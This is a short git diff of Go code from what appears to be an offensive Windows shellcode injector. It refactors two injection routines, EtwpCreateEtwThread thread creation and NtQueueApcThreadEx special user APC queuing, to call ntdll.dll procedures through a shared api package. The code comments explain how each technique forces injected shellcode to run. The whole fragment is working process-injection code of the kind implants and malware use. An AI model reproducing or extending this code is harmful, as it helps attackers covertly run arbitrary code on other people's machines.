@@ -527,8 +527,7 @@ func (w *windowsInjector) injectEtwpCreateEtwThread(shellcode []byte) error {
 	}
 
 	// 4. Call EtwpCreateEtwThread(addr, 0) — creates a thread running at addr
-	proc := windows.NewLazySystemDLL("ntdll.dll").NewProc("EtwpCreateEtwThread")
-	r, _, _ := proc.Call(addr, 0)
+	r, _, _ := api.ProcEtwpCreateEtwThread.Call(addr, 0)
 	if r == 0 {
 		return fmt.Errorf("EtwpCreateEtwThread failed")
 	}
@@ -578,8 +577,6 @@ func (w *windowsInjector) injectNtQueueApcThreadEx(shellcode []byte) error {
 
 	// NtQueueApcThreadEx with QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC (flag=1)
 	// forces delivery without alertable wait
-	procNtQueueApcThreadEx := windows.NewLazySystemDLL("ntdll.dll").NewProc("NtQueueApcThreadEx")
-
 	success := false
 	for _, threadID := range threadIDs {
 		hThread, openErr := windows.OpenThread(
@@ -593,7 +590,7 @@ func (w *windowsInjector) injectNtQueueApcThreadEx(shellcode []byte) error {
 
 		// NtQueueApcThreadEx(ThreadHandle, UserApcReserveHandle|Flags, ApcRoutine, Arg1, Arg2, Arg3)
 		// Flag 1 = QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC
-		status, _, _ := procNtQueueApcThreadEx.Call(
+		status, _, _ := api.ProcNtQueueApcThreadEx.Call(
 			uintptr(hThread),
 			1, // QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC
 			addr,
